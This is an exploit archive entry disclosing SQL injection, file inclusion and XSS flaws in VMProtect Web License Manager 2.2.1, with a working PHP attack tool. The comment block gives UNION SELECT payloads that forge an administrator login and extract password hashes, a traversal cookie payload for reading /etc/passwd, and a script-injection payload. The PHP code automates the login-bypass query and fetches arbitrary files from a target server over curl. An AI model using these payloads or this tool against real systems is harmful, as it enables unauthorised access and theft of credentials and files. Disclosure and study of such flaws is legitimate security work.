@@ -1,0 +1,210 @@
+id: 21660
+date: 12/12/2013
+title: VMProtect Web License Manager 2.2.1 Multiple vulnerabilities
+author: Xylitol
+cves: 
+
+<?php
+/**
+VMProtect Web License Manager 2.2.1 Multiple vulnerabilities
+------------------------------------------------------------
+		Vendor site: http://vmpsoft.com/
+
+		First contact............: 11/09/2013
+		Vendor answer............: 12/09/2013
+		Vendor fixed the RFI/XSS.: 08/11/2013
+		Second contact for SQL...: 25/11/2013
+		Vendor fixed the SQL.....: 30/11/2013
+		PoC Public release.......: 12/12/2013
+
+	File
+	----
+		./inc/dbopen.inc.php
+	
+	What's wrong?
+	-------------
+		This function file works with MySQL databases.
+		A function named 'Sql' (line 13) sanitize an input passed in argument.
+		Line 21, a regular expression extract a substring if 'exp:' is present.
+		If yes, it return it without any further checks.
+		If not, it clear the input with 'mysql_real_escape_string'.
+		So, every input cleared with 'Sql' is vulnerable to SQL Injection attacks.
+	
+	File
+	----
+		./login.php
+	
+	What's wrong?
+	-------------
+		Since dbopen.inc.php's function 'Sql' is vulnerable...
+		
+		$sql = "SELECT * FROM {$DB_PREFIX}users WHERE login=" . Sql($_POST["login"]);
+		
+		Yup! This is really good. From this, we can do a lot of things, like get the
+		password of an user, or get authenticated as an unregistred user.
+		We will authenticated as anyone with an 'UNION SELECT' query.
+		The 'password' field of 'users' database is a SHA-1 hash of the password.
+		
+		The query would like this...
+		
+		=> SELECT * FROM vmp_users WHERE login=NULL UNION SELECT 1, 2, 3, 4, 5, 6
+		
+		1 => id
+		2 => login
+		3 => SHA1(password)
+		4 => email
+		5 => isadmin  (1 for admin, 0 for manager)
+		6 => failures (anti password bruteforcing)
+		
+		To inject this query, just use the trick saw before:
+		
+		=> exp:NULL UNION SELECT 1, 2, 3, 4, 5, 6
+		
+		Fill each inputs with correct values, and get authenticated!
+		
+		Example for:
+			id       => 1337
+			login    => f4g
+			password => f4g
+			email    => f4g@tapz.eu
+			isadmin  => 1
+			failures => 0
+		
+		Login    => exp:NULL UNION SELECT 1337, 0x663467, SHA1(0x663467), 0x663467407461707a2e6575, 1, 0
+		Password => f4g
+		
+		You can also know the hashed password of an user:
+		
+		exp:NULL UNION SELECT 1337, login, SHA1(0x663467), password, 5, 6 FROM vmp_users LIMIT 0, 1
+		
+		The username of the (fake) user is the user's name and the mail is the password...
+		You can see it in the top-right corner.
+		This vulnerability was found by having the source code.
+		The demo panel on the official site was also vulnerable.
+
+	File
+	----
+		./index.php
+	
+	What's wrong?
+	-------------
+		The cookie 'lang' isn't correctly sanitised and lead to Remote file include attacks
+		Cookie input lang was set to ../../../../../../../../../../etc/passwd%00
+		File contents found: root:x:0:0:root:/root:/bin/bash
+		This vulnerability was found without having the source code but was tested on many panels.
+		The demo panel on the official site was also vulnerable.
+
+	File
+	----
+		./offline.php
+	
+	What's wrong?
+	-------------
+		Imput 'url' isn't correctly sanitised and lead to Cross-site scripting attacks:
+		Payload: </textarea><script>prompt(1337)</script>
+		This vulnerability was found without having the source code but was tested on many panels.
+		The demo panel on the official site was also vulnerable.
+
+	Solution
+	--------
+		Upgrade to newest version.
+
+	Thanks
+	------
+		VMProtect team, Xartrick
+		*/
+?>
+<style>
+	label {
+		display: block;
+		width:   100px;
+		float:   left;
+	}
+</style>
+
+<form method="POST">
+	<label for="id">Id:</label>             <input name="id"       id="id"       type="number"   value="1337" />       <br />
+	<label for="login">Login:</label>       <input name="login"    id="login"    type="textbox"  value="f4g" />        <br />
+	<label for="password">Password:</label> <input name="password" id="password" type="password" value="f4g" />        <br />
+	<label for="email">Email:</label>       <input name="email"    id="email"    type="email"    value="f4g@tapz.eu" /><br />
+	<label for="isadmin">Admin:</label>     <input name="isadmin"  id="isadmin"  type="checkbox" checked="true" />     <br />
+	                                        <input type="submit" value="Send" />
+</form>
+
+<form method="POST">
+	<label for="website">Website:</label> <input name="website" id="website" type="textbox" value="" />                          <br />
+	<label for="file">File:</label>       <input name="file"    id="file"    type="textbox" value="../../../../../../../../../../windows/win.ini" /><br />
+	                                      <input type="submit" value="Get" />
+</form> 
+
+<?php
+	$input_user = array('id', 'login', 'password', 'email');
+	$input_file = array('website', 'file');
+	
+	if (checkInput($input_user)) {
+		$id       = intval($_POST['id']);
+		$login    = $_POST['login'];
+		$password = $_POST['password'];
+		$email    = $_POST['email'];
+		$isAdmin  = isset($_POST['isadmin']);
+		
+		$query  = 'exp:NULL UNION SELECT ';
+		$query .= $id                                 . ', ';  // id
+		$query .= '0x' . stringToHex($login)          . ', ';  // login
+		$query .= 'SHA1(0x' . stringToHex($password)  . '), '; // password
+		$query .= '0x' . stringToHex($email)          . ', ';  // email
+		$query .= (($isAdmin) ? '1' : '0')            . ', ';  // isadmin
+		$query .= '0';                                         // failures
+?>
+<br />
+
+<form>
+	<label for="login">Login:</label>       <input name="login"    type="textbox" value="<?php echo($query); ?>" /><br />
+	<label for="password">Password:</label> <input name="password" type="textbox" value="<?php echo(htmlentities($password, ENT_QUOTES)); ?>" />
+</form>
+<?php
+	}
+	
+	if (checkInput($input_file)) {
+		if (filter_var($_POST['website'], FILTER_VALIDATE_URL)) {
+			$curl = curl_init($_POST['website'] . 'include/lang.inc.php');
+			
+			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+			curl_setopt($curl, CURLOPT_HEADER, false);
+			curl_setopt($curl, CURLOPT_COOKIE, 'lang=' . urlencode($_POST['file'] . chr(0)) . ';');
+			
+			$page = curl_exec($curl);
+?>
+<textarea rows="20" cols="100" disabled="disabled" wrap="off"><?php echo($page); ?></textarea>
+<?php			
+		}
+	}
+	
+	function stringToHex($str) {
+		$hex = null;
+		
+		for ($i = 0; $i < strlen($str); $i++)
+			$hex .= str_pad(dechex(ord($str[$i])), 2, '0', STR_PAD_LEFT);
+		
+		return $hex;
+	}
+	
+	function checkInput($inputs) {
+		global $_POST;
+		
+		foreach ($inputs as $input) {
+			if (!isset($_POST[$input]))
+				return false;
+			
+			if (is_array($_POST[$input]))
+				return false;
+			
+			if ($_POST[$input] == '')
+				return false;
+		}
+		
+		return true;
+	}
+?>
+
+#  0day.today [2023-03-25]  #
